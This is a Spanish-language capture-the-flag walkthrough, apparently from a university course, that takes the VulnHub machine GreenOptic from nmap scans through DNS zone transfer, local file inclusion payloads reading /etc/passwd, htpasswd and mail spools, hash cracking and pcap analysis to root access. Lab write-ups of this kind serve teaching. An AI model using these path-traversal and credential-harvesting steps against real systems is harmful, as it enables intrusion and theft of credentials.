# Descargar la maquina CTF desde 
```
https://www.vulnhub.com/entry/greenoptic-1,510/
```

# 1. RECONOCIMIENTO
-------------------------------------------------------------------
Se realizará la recopilación de toda la información posible como direcciones IP, nombres de dominios, información de contactos, servicios públicos disponibles en la página. Se dividirá en escaneo de puertos, enumeración de servicios, enumeración de grupos y permisos, enumeración de nombres de dominio.

Escaneo con netdiscover, para encontrar la IP valida de la máquina.
> netdiscover -r 192.168.115.0/24

![image](https://github.com/lidiaelopezh/pucp-hacking/blob/463dc77a285fdcaf1a56ff5299964e7b87b5bd5b/images/Imagen1.png)
 

Escaneo de host en una misma red.
> nmap -sn 192.168.115.0/24

![image](https://github.com/lidiaelopezh/pucp-hacking/blob/463dc77a285fdcaf1a56ff5299964e7b87b5bd5b/images/Imagen2.png)
 

Escaneo de puertos en el host con IP 192.168.115.149 de GreenOptic. Detectando el SO, versiones de software, scripts y traceroute
> nmap -O 192.168.115.149

![image](https://github.com/lidiaelopezh/pucp-hacking/blob/463dc77a285fdcaf1a56ff5299964e7b87b5bd5b/images/Imagen3.png)

> nmap -sV 192.168.115.149

![image](https://github.com/lidiaelopezh/pucp-hacking/blob/463dc77a285fdcaf1a56ff5299964e7b87b5bd5b/images/Imagen4.png)

Realizando un escaneo más completo de puertos:
> nmap -T4 -A -v -p- 192.168.115.149 -oA greenOptic.txt

![image](https://github.com/lidiaelopezh/pucp-hacking/blob/463dc77a285fdcaf1a56ff5299964e7b87b5bd5b/images/Imagen5.png)

![image](https://github.com/lidiaelopezh/pucp-hacking/blob/463dc77a285fdcaf1a56ff5299964e7b87b5bd5b/images/Imagen7.png)
 
![image](https://github.com/lidiaelopezh/pucp-hacking/blob/463dc77a285fdcaf1a56ff5299964e7b87b5bd5b/images/Imagen8.png)

![image](https://github.com/lidiaelopezh/pucp-hacking/blob/463dc77a285fdcaf1a56ff5299964e7b87b5bd5b/images/Imagen9.png)


# 2. ANÁLISIS DE VULNERABILIDADES
-------------------------------------------------------------------
Evaluaremos cuales pueden ser las vulnerabilidades potenciales obtenidas de los escaneos previos, así como de la revisión de los servicios encontrados. Tratando de abrir el servicio de cada puerto, obtenido del resultado del escaneo con nmap.

Analizamos las componentes de la página web que está en la IP 192.168.115.149. Se revisa y se encuentra que:
- Probador de conectividad en el que puedes introducir tu código postal o el número de teléfono fijo.
- Formulario de contacto en la parte inferior de la página.

![image](https://github.com/lidiaelopezh/pucp-hacking/blob/463dc77a285fdcaf1a56ff5299964e7b87b5bd5b/images/Imagen10.png)

![image](https://github.com/lidiaelopezh/pucp-hacking/blob/463dc77a285fdcaf1a56ff5299964e7b87b5bd5b/images/Imagen11.png)

En el Puerto 21:
> ftp 192.168.115.149

![image](https://github.com/lidiaelopezh/pucp-hacking/blob/463dc77a285fdcaf1a56ff5299964e7b87b5bd5b/images/Imagen12.png)

En el Puerto 10000 se encuentra el servicio de webmin, así que abrimos en el navegador:
> 192.168.115.149:10000

![image](https://github.com/lidiaelopezh/pucp-hacking/blob/463dc77a285fdcaf1a56ff5299964e7b87b5bd5b/images/Imagen13.png)

Da un error, asi que se agrega el dominio brindado en el host local 
> cat /etc/hosts

![image](https://github.com/lidiaelopezh/pucp-hacking/blob/463dc77a285fdcaf1a56ff5299964e7b87b5bd5b/images/Imagen14.png)

> nano /etc/hosts
192.168.115.149 websrv01.greenoptic.vm
192.168.115.149 greenoptic.vm

![image](https://github.com/lidiaelopezh/pucp-hacking/blob/463dc77a285fdcaf1a56ff5299964e7b87b5bd5b/images/Imagen15.png)

Volviendo a cargar la página, se obtiene:
 
![image](https://github.com/lidiaelopezh/pucp-hacking/blob/463dc77a285fdcaf1a56ff5299964e7b87b5bd5b/images/Imagen16.png)

# 3. EXPLOTACIÓN DE VULNERABILIDADES
-------------------------------------------------------------------
Para ver existe una vulnerabilidad de transmisión de dominio DNS (el servicio en el puerto 53)
> dig axfr @192.168.115.149 greenoptic.vm

192.168.115.149 recoveryplan.greenoptic.vm

![image](https://github.com/lidiaelopezh/pucp-hacking/blob/463dc77a285fdcaf1a56ff5299964e7b87b5bd5b/images/Imagen17.png)

Se obtuvo otro nombre de dominio, se configura nuevamente el hosts.

![image](https://github.com/lidiaelopezh/pucp-hacking/blob/463dc77a285fdcaf1a56ff5299964e7b87b5bd5b/images/Imagen18.png)

Visitamos el dominio recoveryplan.greenoptic.vm. Se encuentra que se requiere autenticación básica.

![image](https://github.com/lidiaelopezh/pucp-hacking/blob/463dc77a285fdcaf1a56ff5299964e7b87b5bd5b/images/Imagen19.png)

![image](https://github.com/lidiaelopezh/pucp-hacking/blob/463dc77a285fdcaf1a56ff5299964e7b87b5bd5b/images/Imagen20.png)

Uso gobuster para escanear el directorio y encontrar la cuenta del directorio.
> gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x .php,.html,.txt -u 192.168.115.149

![image](https://github.com/lidiaelopezh/pucp-hacking/blob/463dc77a285fdcaf1a56ff5299964e7b87b5bd5b/images/Imagen21.png)

Para acceder al directorio, la url es:
http://192.168.115.149/account/index.php?include=cookiewarning

![image](https://github.com/lidiaelopezh/pucp-hacking/blob/463dc77a285fdcaf1a56ff5299964e7b87b5bd5b/images/Imagen22.png)

Al cambiar ‘cookiewarning’ por ‘../../../../../../../../etc/passwd’ en el navegador, colocamos:
> http://192.168.115.149/account/index.php?include=../../../../../../../../etc/passwd

En la parte inferior se visualizamos una serie de datos lo que demuestra que la aplicación es vulnerable a LFI.

![image](https://github.com/lidiaelopezh/pucp-hacking/blob/463dc77a285fdcaf1a56ff5299964e7b87b5bd5b/images/Imagen23.png)

En el dominio de recoveryplan.greenoptic.vm que se obtuvo anteriormente que nos pedía autenticación, probamos la vulnerabilidad LFI a través del archivo /var/www/htpasswd.
http://192.168.115.149/account/index.php?include=../../../../../../../../var/www/htpasswd

![image](https://github.com/lidiaelopezh/pucp-hacking/blob/463dc77a285fdcaf1a56ff5299964e7b87b5bd5b/images/Imagen24.png) 

Encontramos las credenciales encriptadas:
staff:$apr1$YQNFpPkc$rhUZOxRE55Nkl4EDn.1Po.

Usando JohnTheRipper y el diccionario " rockyou ", logramos descifrar el hash y obtener la contraseña en texto sin formato.

Primero creamos un archivo de texto que contenga la credencial encontrada (hash.txt).
> echo 'staff:$apr1$YQNFpPkc$rhUZOxRE55Nkl4EDn.1Po.' > hash.txt

![image](https://github.com/lidiaelopezh/pucp-hacking/blob/463dc77a285fdcaf1a56ff5299964e7b87b5bd5b/images/Imagen25.png)

Usando JohnTheRipper y el diccionario ‘rockyou’
> john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt

![image](https://github.com/lidiaelopezh/pucp-hacking/blob/463dc77a285fdcaf1a56ff5299964e7b87b5bd5b/images/Imagen26.png)

Inicialmente el archivo rockyou.txt no fue encontrado, analizando vemos q esta empaquetado. Nos dirigimos a la ruta /usr/share/wordlists y procedemos a desempaquetarlo con:

> gzip -d rockyou.txt.gz

![image](https://github.com/lidiaelopezh/pucp-hacking/blob/463dc77a285fdcaf1a56ff5299964e7b87b5bd5b/images/Imagen27.png)

Usando nuevamente JohnTheRipper y el diccionario ‘rockyou’
> john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt

Se obtiene la contraseña para el usuario staff, que es wheeler.

![image](https://github.com/lidiaelopezh/pucp-hacking/blob/463dc77a285fdcaf1a56ff5299964e7b87b5bd5b/images/Imagen28.png)

Ingresando las credenciales obtenidas en el url recoveryplan.greenoptic.vm

![image](https://github.com/lidiaelopezh/pucp-hacking/blob/463dc77a285fdcaf1a56ff5299964e7b87b5bd5b/images/Imagen29.png)

Se observa un sitio web ‘phpBB’, que funciona como tablón de anuncios gratuito y es de código abierto. Ingresamos a ‘Key Information’, al mensaje ‘Team message’

![image](https://github.com/lidiaelopezh/pucp-hacking/blob/463dc77a285fdcaf1a56ff5299964e7b87b5bd5b/images/Imagen30.png)

Se encuentra un correo, en el que un usuario está discutiendo el último ataque a su empresa y también compartió un archivo zip llamado dpi.zip y la contraseña de este archivo zip fue enviada por correo electrónico al usuario Sam.

![image](https://github.com/lidiaelopezh/pucp-hacking/blob/463dc77a285fdcaf1a56ff5299964e7b87b5bd5b/images/Imagen31.png)
 
Encontramos de los correos se almacenan en /var/mail/[usuario].

Usando la inclusión de archivos, para obtener los correos recibidos por sam:
http://192.168.115.149/account/index.php?include=../../../../../../../../var/mail/sam

![image](https://github.com/lidiaelopezh/pucp-hacking/blob/463dc77a285fdcaf1a56ff5299964e7b87b5bd5b/images/Imagen32.png)

Se obtiene:

From terry@greenoptic.vm Sun Jul 12 16:13:45 2020 Return-Path: X-Original-To: sam Delivered-To: sam@websrv01.greenoptic.vm Received: from localhost (localhost [IPv6:::1]) by websrv01.greenoptic.vm (Postfix) with ESMTP id A8D371090085 for ; Sun, 12 Jul 2020 16:13:18 +0100 (BST) Message-Id: <20200712151322.A8D371090085@websrv01.greenoptic.vm> Date: Sun, 12 Jul 2020 16:13:18 +0100 (BST) From: terry@greenoptic.vm Hi Sam, per the team message, the password is HelloSunshine123

Del ultimo correo se tiene la contraseña de Sam.

Procedemos con descargar el archivo dpi.zip por comando
> curl http://recoveryplan.greenoptic.vm/dpi.zip -u staff --output dpi.zip4

![image](https://github.com/lidiaelopezh/pucp-hacking/blob/463dc77a285fdcaf1a56ff5299964e7b87b5bd5b/images/Imagen33.png)

Con la contraseña (HelloSunshine123) obtenida del correo de sam, desempaquetamos el zip4. Obtenemos un archivo dpi.pcap.

![image](https://github.com/lidiaelopezh/pucp-hacking/blob/463dc77a285fdcaf1a56ff5299964e7b87b5bd5b/images/Imagen34.png)

![image](https://github.com/lidiaelopezh/pucp-hacking/blob/463dc77a285fdcaf1a56ff5299964e7b87b5bd5b/images/Imagen35.png)
 

De igual manera se podría ver el mensaje recibido por terry, con el siguiente url:
http://192.168.115.149/account/index.php?include=../../../../../../../../var/mail/terry

![image](https://github.com/lidiaelopezh/pucp-hacking/blob/463dc77a285fdcaf1a56ff5299964e7b87b5bd5b/images/Imagen36.png)

From serversupport@greenoptic.vm Sun Jul 12 15:52:19 2020 Return-Path: X-Original-To: terry Delivered-To: terry@websrv01.greenoptic.vm Received: from localhost (localhost [IPv6:::1]) by websrv01.greenoptic.vm (Postfix) with ESMTP id C54E21090083 for ; Sun, 12 Jul 2020 15:51:32 +0100 (BST) Message-Id: <20200712145137.C54E21090083@websrv01.greenoptic.vm> Date: Sun, 12 Jul 2020 15:51:32 +0100 (BST) From: serversupport@greenoptic.vm Terry As per your request we have installed phpBB to help with incident response. Your username is terry, and your password is wsllsa!2 Let us know if you have issues Server Support – Linux

Del mensaje se obtiene la contraseña de la cuenta de terry, la cual es wsllsa!2.

Ahora procedemos abrir el archivo dpi.pcap con wireshark y filtrando por FTP, se obtiene:

![image](https://github.com/lidiaelopezh/pucp-hacking/blob/463dc77a285fdcaf1a56ff5299964e7b87b5bd5b/images/Imagen37.png)

Se obtiene la contraseña para el usuario alex, la cual es: FwejAASD1


# 4. ESCALAMIENTO DE PRIVILEGIOS
-------------------------------------------------------------------
Entonces iniciamos como usuario alex a través de SSH usando el nombre del usuario alex@greenoptic.vm y password FwejAASD1.
> ssh alex@greenoptic.vm

![image](https://github.com/lidiaelopezh/pucp-hacking/blob/463dc77a285fdcaf1a56ff5299964e7b87b5bd5b/images/Imagen38.png)
 
![image](https://github.com/lidiaelopezh/pucp-hacking/blob/463dc77a285fdcaf1a56ff5299964e7b87b5bd5b/images/Imagen39.png)

Se logro ingresar al usuario alex.

![image](https://github.com/lidiaelopezh/pucp-hacking/blob/463dc77a285fdcaf1a56ff5299964e7b87b5bd5b/images/Imagen40.png)

Ahora tratamos de escalar los privilegios para llegar a root.

Se obtiene de la identificación del usuario alex (id), que desde el usuario en ssh se puede ejecutar wireshark.

Asi salimos y nuevamente ingresamos por ssh.
> ssh –X alex@greenoptic.vm

![image](https://github.com/lidiaelopezh/pucp-hacking/blob/463dc77a285fdcaf1a56ff5299964e7b87b5bd5b/images/Imagen41.png)

Y luego ejecutamos wireshark

![image](https://github.com/lidiaelopezh/pucp-hacking/blob/463dc77a285fdcaf1a56ff5299964e7b87b5bd5b/images/Imagen42.png)

Seleccionamos any, obteniendo

![image](https://github.com/lidiaelopezh/pucp-hacking/blob/463dc77a285fdcaf1a56ff5299964e7b87b5bd5b/images/Imagen43.png)

Cada pocos minutos se obtiene el mismo paquete de tráfico.

![image](https://github.com/lidiaelopezh/pucp-hacking/blob/463dc77a285fdcaf1a56ff5299964e7b87b5bd5b/images/Imagen44.png)

![image](https://github.com/lidiaelopezh/pucp-hacking/blob/463dc77a285fdcaf1a56ff5299964e7b87b5bd5b/images/Imagen45.png)
 

Al ver el paquete, se observa una contraseña que esta codificada en base64.

Decodificamos el hash, para obtener la contraseña para root.
> echo -n AHJvb3QAQVNmb2pvajJlb3p4Y3p6bWVkbG1lZEFTQVNES29qM28= | base64 –d

![image](https://github.com/lidiaelopezh/pucp-hacking/blob/463dc77a285fdcaf1a56ff5299964e7b87b5bd5b/images/Imagen46.png)

Entonces obtenemos la contraseña de root, que es ‘ASfojoj2eozxczzmedlmedASASDKoj3o’.

Ahora podemos iniciar sesión a través de ssh con root y la contraseña obtenida.
> ssh root@greenoptic.vm

![image](https://github.com/lidiaelopezh/pucp-hacking/blob/463dc77a285fdcaf1a56ff5299964e7b87b5bd5b/images/Imagen47.png)

Se muestra el mensaje de GreenOptic que el reto ha sido completado.

![image](https://github.com/lidiaelopezh/pucp-hacking/blob/463dc77a285fdcaf1a56ff5299964e7b87b5bd5b/images/Imagen48.png)

